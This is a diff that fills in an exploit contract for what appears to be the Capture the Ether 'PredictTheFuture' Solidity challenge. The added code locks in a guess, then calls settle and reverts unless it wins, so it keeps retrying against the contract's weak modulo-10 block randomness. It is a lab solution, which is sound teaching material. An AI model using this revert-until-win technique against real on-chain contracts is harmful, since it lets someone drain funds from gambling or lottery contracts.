@@ -48,10 +48,28 @@ contract PredictTheFuture {
 
 contract ExploitContract {
     PredictTheFuture public predictTheFuture;
+    // From settle, the anwser could only in the range of (0~9), because of the (% 10) in the line 39.
+    // We can guess one number through lockInGuess and  1 ether of mine is locked in PredictTheFuture.guess
+    // After 2 blocks, the function settle can be called, but we'll lose the 1 ether if the guess fail, because it will reset the guesser.
+    // As such, the key is find a way to maintain the guesser. It's a good idea to revert if settle failed.
 
     constructor(PredictTheFuture _predictTheFuture) {
         predictTheFuture = _predictTheFuture;
     }
 
     // Write your exploit code below
+
+    function lockInGuess(uint8 n) public payable {
+        require(address(this).balance == 1 ether, "balance not enough");
+        predictTheFuture.lockInGuess{value: 1 ether}(n);
+    }
+
+    function settle() public {
+        predictTheFuture.settle();
+        require(predictTheFuture.isComplete(), "settle failed"); // revert if the settle failed, the guesser will maintain.
+    }
+    // Don't forget this!
+    receive() external payable {
+
+    }
 }
